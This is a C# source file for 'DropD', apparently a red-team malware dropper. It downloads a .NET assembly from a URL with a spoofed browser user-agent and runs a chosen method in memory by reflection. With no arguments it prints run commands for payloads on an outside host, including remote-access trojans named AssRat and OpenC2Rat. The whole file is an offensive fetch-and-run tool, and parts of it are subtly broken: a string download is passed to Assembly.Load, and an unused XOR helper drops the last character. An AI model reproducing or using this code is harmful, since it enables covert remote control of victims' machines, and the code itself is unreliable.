using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Reflection;
using System.Net;
using System.IO;

using System.Diagnostics;
using System.IO.Compression;
using System.Runtime.InteropServices;
using System.Security.Principal;

namespace DropD
{
    class Program
    {
        private static string XorWithKey(string text, string key)
        {
            var decrypted = new StringBuilder();

            for (int i = 0; i < (text.Length - 1); i++)
            {
                decrypted.Append((char)((uint)text[i] ^ (uint)key[i % key.Length]));
            }

            return decrypted.ToString();
        }
        static void Main(string[] args)
        {
            var wc = new WebClient();
            wc.Headers.Add("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36");

            if (args.Length == 0)
            {
                if (args.Length == 0)
                {
                    Console.WriteLine("No URL specified. Available control payloads:");
                    Console.WriteLine("\n\n");
                    Console.WriteLine("AssRat: http://shrinebuilder.milkybeefers.com:8000/AssRat.dll type: AssRat.Program method: Main");
                    Console.WriteLine("\n.\\DropD.exe http://shrinebuilder.milkybeefers.com:8000/AssRat.dll AssRat.Program Main");
                    Console.WriteLine("\n\n");
                    Console.WriteLine("PapaCalc: http://shrinebuilder.milkybeefers.com:8000/PapaCalc.dll type: PapaCalc.CalculatorStarter method: StartCalculator");
                    Console.WriteLine("\n.\\DropD.exe http://shrinebuilder.milkybeefers.com:8000/PapaCalc.dll PapaCalc.CalculatorStarter StartCalculator");
                    Console.WriteLine("\n\n");
                    Console.WriteLine("OpenC2Rat: http://shrinebuilder.milkybeefers.com:8000/OpenC2Rat-merged.dll type: OpenC2Rat.OpenC2Rat method: I Parameter: url");
                    Console.WriteLine("\n.\\DropD.exe http://shrinebuilder.milkybeefers.com:8000/OpenC2Rat-merged.dll OpenC2Rat.OpenC2Rat I http://shrinebuilder.milkybeefers.com");
                    Console.WriteLine("\n\n");
                    Console.WriteLine("ShrineTest: http://shrinebuilder.milkybeefers.com:8000/ShrineTest.dll type: ShrineTest.Program method: Main");
                    Console.WriteLine("\n.\\DropD.exe http://shrinebuilder.milkybeefers.com:8000/ShrineTest.dll ShrineTest.Program Main");
                    return;
                }
            }

            string url = args[0];
            string type = args[1];
            string method = args[2];

            Assembly a = null;

            if (url.StartsWith("file://") || url.StartsWith("file:"))
            {
                a = Assembly.LoadFrom(url.Replace("file://", string.Empty));
            }
            else
            {
                var wc2 = new WebClient();
                wc2.Headers.Add("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36");
                a = Assembly.Load(wc2.DownloadString(url));
            }

            var t = a.GetType(type);
            var c = Activator.CreateInstance(t);

            // Execute specified method
            var m = t.GetMethod(method);
            var output = (String)m.Invoke(c, null);

            // Pause for input
            Console.WriteLine(output);
        }
    }
}


